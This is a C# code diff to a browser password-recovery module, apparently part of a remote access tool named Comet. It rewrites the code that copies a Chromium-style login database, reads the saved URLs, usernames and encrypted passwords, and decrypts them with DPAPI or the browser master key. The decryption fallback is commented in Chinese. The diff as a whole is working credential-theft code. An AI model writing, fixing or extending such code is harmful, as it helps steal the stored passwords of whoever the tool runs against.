@@ -2,14 +2,18 @@
 using Comet.Client.Recovery.Utilities;
 using Comet.Common.DNS;
 using Comet.Common.Models;
-using CS_SQLite3;
 using System;
 using System.Collections.Generic;
 using System.Data;
+using System.Data.SQLite;
+using System.Data.SqlTypes;
+using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
+using System.Xml.Linq;
 
 namespace Comet.Client.Recovery.Browsers
 {
@@ -44,43 +48,65 @@ namespace Comet.Client.Recovery.Browsers
                 {
                     File.Copy(filePath, filePath + "B",true);
                     filePath += "B";
-                    SQLiteDatabase database = new SQLiteDatabase(filePath);
+                    //SQLiteDatabase database = new SQLiteDatabase(filePath);
                     string query = "SELECT origin_url, username_value, password_value FROM logins";
-                    DataTable resultantQuery = database.ExecuteQuery(query);
-                    foreach (DataRow row in resultantQuery.Rows)
+                    string connectionString = "data source=" +  filePath + ";version=3;";
+                    //DataTable resultantQuery = database.ExecuteQuery(query);
+                    //DataSet ds = DbHelperSQLite.Query(query);
+
+                    using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                     {
-                        string url;
-                        string username;
-                        string password="";
-                        string crypt_password;
-                        url = (string)row["origin_url"].ToString();
-                        username = (string)row["username_value"].ToString();
-                        crypt_password = row["password_value"].ToString();
-                        byte[] passwordBytes = Convert.FromBase64String(crypt_password);
+                        DataSet ds = new DataSet();
                         try
                         {
-                            //老版本解密
-                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
-                            
-                            
+                            connection.Open();
+                            SQLiteDataAdapter command = new SQLiteDataAdapter(query, connection);
+                            command.Fill(ds, "ds");
+                            var table = ds.Tables[0];
+                            Debug.WriteLine($"Rows count: {table.Rows.Count}");
+                            Debug.WriteLine($"Columns: {string.Join(", ", table.Columns.Cast<DataColumn>().Select(c => c.ColumnName))}");
                         }
-                        catch (Exception) //如果异常了就用新加密方式尝试
+                        catch (System.Data.SQLite.SQLiteException ex)
                         {
-                            byte[] masterKey = GetMasterKey(localStatePath);
-                            password = DecryptWithKey(passwordBytes, masterKey);
+                            MessageBox.Show(ex.Message);
                         }
-                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
+                        catch (Exception ex)
                         {
-                            result.Add(new SaveUser
+                            MessageBox.Show("Error while reading the database: " + ex.Message);
+                        }
+
+                        foreach (DataRow row in ds.Tables[0].Rows)
+                        {
+                            string password = "";
+                            string url = row["origin_url"].ToString();
+                            string username = row["username_value"].ToString();
+                            if (!string.IsNullOrEmpty(username)) 
                             {
-                                Url = url,
-                                Username = username,
-                                Password = password,
-                                Application = ApplicationName
-                            });
+                                byte[] passwordBytes = (byte[])row["password_value"];
+                                try
+                                {
+                                    //老版本解密
+                                    password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
+                                }
+                                catch (Exception) //如果异常了就用新加密方式尝试
+                                {
+                                    byte[] masterKey = GetMasterKey(localStatePath);
+                                    password = DecryptWithKey(passwordBytes, masterKey);
+                                }
+                                if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
+                                {
+                                    result.Add(new SaveUser
+                                    {
+                                        Url = url,
+                                        Username = username,
+                                        Password = password,
+                                        Application = ApplicationName
+                                    });
+                                }
+                            }
                         }
                     }
-                    database.CloseDatabase();
+                    return result;
                 }
                 catch (Exception)
                 {
